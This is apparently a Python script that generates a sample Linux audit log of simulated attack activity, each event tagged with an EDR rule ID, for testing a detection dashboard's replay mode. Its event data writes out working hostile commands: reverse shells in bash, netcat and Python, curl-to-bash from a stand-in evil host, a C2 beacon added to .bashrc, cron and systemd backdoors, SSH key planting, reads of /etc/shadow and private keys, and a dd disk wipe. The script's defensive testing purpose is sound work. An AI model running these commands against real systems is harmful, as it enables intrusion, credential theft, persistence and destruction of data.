#!/usr/bin/env python3
"""
generate_sample_log.py — Create a realistic sample audit log for replay mode testing.

Usage:
    uv run python generate_sample_log.py
    # Creates: data/sample_audit.log
"""
import time

EVENTS = [
    # EDR-301 — id/whoami
    ('SYSCALL', {'pid': '1001', 'uid': '1000', 'exe': '/usr/bin/id',    'comm': 'id'}),
    ('EXECVE',  {'argc': '1', 'a0': 'id'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-302 — ifconfig
    ('SYSCALL', {'pid': '1002', 'uid': '1000', 'exe': '/sbin/ifconfig', 'comm': 'ifconfig'}),
    ('EXECVE',  {'argc': '1', 'a0': 'ifconfig'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-305 — ps aux
    ('SYSCALL', {'pid': '1003', 'uid': '1000', 'exe': '/bin/ps',       'comm': 'ps'}),
    ('EXECVE',  {'argc': '2', 'a0': 'ps', 'a1': 'aux'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-306 — crontab -l
    ('SYSCALL', {'pid': '1004', 'uid': '1000', 'exe': '/usr/bin/crontab', 'comm': 'crontab'}),
    ('EXECVE',  {'argc': '2', 'a0': 'crontab', 'a1': '-l'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-101 — sudo -l
    ('SYSCALL', {'pid': '1005', 'uid': '1000', 'exe': '/usr/bin/sudo', 'comm': 'sudo'}),
    ('EXECVE',  {'argc': '2', 'a0': 'sudo', 'a1': '-l'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-307 — find SUID
    ('SYSCALL', {'pid': '1006', 'uid': '1000', 'exe': '/usr/bin/find', 'comm': 'find'}),
    ('EXECVE',  {'argc': '5', 'a0': 'find', 'a1': '/', 'a2': '-perm', 'a3': '-4000', 'a4': '-type f'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-303 — /etc/shadow read
    ('SYSCALL', {'pid': '1007', 'uid': '0', 'exe': '/bin/cat',        'comm': 'cat'}),
    ('EXECVE',  {'argc': '2', 'a0': 'cat', 'a1': '/etc/shadow'}),
    ('CWD',     {'cwd': '/root'}),

    # EDR-304 — SSH key read
    ('SYSCALL', {'pid': '1008', 'uid': '1000', 'exe': '/bin/cat',     'comm': 'cat'}),
    ('EXECVE',  {'argc': '2', 'a0': 'cat', 'a1': '/home/user/.ssh/id_rsa'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-201 — curl download to /tmp
    ('SYSCALL', {'pid': '1010', 'uid': '1000', 'exe': '/usr/bin/curl', 'comm': 'curl'}),
    ('EXECVE',  {'argc': '4', 'a0': 'curl', 'a1': '-o', 'a2': '/tmp/payload.sh', 'a3': 'http://evil.example.com/payload.sh'}),
    ('CWD',     {'cwd': '/tmp'}),

    # EDR-103 — chmod +s
    ('SYSCALL', {'pid': '1011', 'uid': '0', 'exe': '/bin/chmod',      'comm': 'chmod'}),
    ('EXECVE',  {'argc': '3', 'a0': 'chmod', 'a1': '+s', 'a2': '/tmp/backdoor'}),
    ('CWD',     {'cwd': '/tmp'}),

    # EDR-102 — SUID exec from /tmp as root
    ('SYSCALL', {'pid': '1012', 'uid': '0', 'exe': '/tmp/backdoor',   'comm': 'backdoor'}),
    ('EXECVE',  {'argc': '1', 'a0': '/tmp/backdoor'}),
    ('CWD',     {'cwd': '/tmp'}),

    # EDR-404 — .bashrc modification
    ('SYSCALL', {'pid': '1013', 'uid': '1000', 'exe': '/bin/bash',    'comm': 'bash'}),
    ('EXECVE',  {'argc': '3', 'a0': 'bash', 'a1': '-c', 'a2': 'echo "curl http://c2.evil.com/beacon|bash" >> /home/user/.bashrc'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-401 — cron backdoor
    ('SYSCALL', {'pid': '1014', 'uid': '0', 'exe': '/bin/bash',       'comm': 'bash'}),
    ('EXECVE',  {'argc': '3', 'a0': 'bash', 'a1': '-c', 'a2': 'echo "* * * * * root /tmp/backdoor" > /etc/cron.d/evil'}),
    ('CWD',     {'cwd': '/tmp'}),

    # EDR-402 — SSH authorized_keys write
    ('SYSCALL', {'pid': '1015', 'uid': '1000', 'exe': '/bin/bash',    'comm': 'bash'}),
    ('EXECVE',  {'argc': '3', 'a0': 'bash', 'a1': '-c', 'a2': 'echo "ssh-rsa AAAA... attacker" >> /home/user/.ssh/authorized_keys'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-403 — systemd service
    ('SYSCALL', {'pid': '1016', 'uid': '0', 'exe': '/bin/bash',       'comm': 'bash'}),
    ('EXECVE',  {'argc': '3', 'a0': 'bash', 'a1': '-c', 'a2': 'cp /tmp/evil.service /etc/systemd/system/evil.service'}),
    ('CWD',     {'cwd': '/tmp'}),

    # EDR-405 — LD_PRELOAD
    ('SYSCALL', {'pid': '1017', 'uid': '1000', 'exe': '/bin/bash',    'comm': 'bash'}),
    ('EXECVE',  {'argc': '3', 'a0': 'bash', 'a1': '-c', 'a2': 'LD_PRELOAD=/tmp/evil.so /usr/bin/sudo -l'}),
    ('CWD',     {'cwd': '/tmp'}),

    # EDR-001 — reverse shell bash /dev/tcp  (CRITICAL)
    ('SYSCALL', {'pid': '3847', 'uid': '1000', 'exe': '/bin/bash',    'comm': 'bash'}),
    ('EXECVE',  {'argc': '3', 'a0': 'bash', 'a1': '-i', 'a2': 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-002 — netcat reverse shell  (CRITICAL)
    ('SYSCALL', {'pid': '3850', 'uid': '1000', 'exe': '/bin/nc',      'comm': 'nc'}),
    ('EXECVE',  {'argc': '4', 'a0': 'nc', 'a1': '-e', 'a2': '/bin/bash', 'a3': '192.168.1.10 4444'}),
    ('CWD',     {'cwd': '/tmp'}),

    # EDR-003 — python reverse shell  (CRITICAL)
    ('SYSCALL', {'pid': '3851', 'uid': '1000', 'exe': '/usr/bin/python3', 'comm': 'python3'}),
    ('EXECVE',  {'argc': '3', 'a0': 'python3', 'a1': '-c',
                 'a2': 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-202 — curl pipe to bash  (CRITICAL)
    ('SYSCALL', {'pid': '3852', 'uid': '1000', 'exe': '/usr/bin/curl', 'comm': 'curl'}),
    ('EXECVE',  {'argc': '3', 'a0': 'curl', 'a1': 'http://evil.example.com/exploit.sh', 'a2': '| bash'}),
    ('CWD',     {'cwd': '/home/user'}),

    # EDR-207 — dd disk wipe  (HIGH)
    ('SYSCALL', {'pid': '1020', 'uid': '0', 'exe': '/bin/dd',         'comm': 'dd'}),
    ('EXECVE',  {'argc': '3', 'a0': 'dd', 'a1': 'if=/dev/zero', 'a2': 'of=/dev/sda'}),
    ('CWD',     {'cwd': '/root'}),
]


def make_line(rec_type: str, serial: int, ts: float, fields: dict) -> str:
    kv = " ".join(f'{k}="{v}"' if " " in str(v) else f"{k}={v}" for k, v in fields.items())
    return f"type={rec_type} msg=audit({ts:.3f}:{serial}): {kv}"


def main() -> None:
    import os
    os.makedirs("data", exist_ok=True)
    out_path = "data/sample_audit.log"

    base_ts = 1726459622.000
    serial = 100
    lines = []

    i = 0
    while i < len(EVENTS):
        rec_type, fields = EVENTS[i]
        if rec_type == "SYSCALL":
            # Collect this SYSCALL + any following EXECVE/CWD with the same serial
            group = [(rec_type, fields)]
            i += 1
            while i < len(EVENTS) and EVENTS[i][0] != "SYSCALL":
                group.append(EVENTS[i])
                i += 1
            ts = base_ts + serial * 0.5
            for gt, gf in group:
                lines.append(make_line(gt, serial, ts, gf))
            serial += 1
        else:
            i += 1

    with open(out_path, "w") as fh:
        fh.write("\n".join(lines) + "\n")

    print(f"✓ Written {len(lines)} lines → {out_path}")
    print(f"  Serial range: 100–{serial - 1}  ({serial - 100} events)")
    print(f"\nReplay in the dashboard UI:")
    print(f"  Path: {os.path.abspath(out_path)}")


if __name__ == "__main__":
    main()
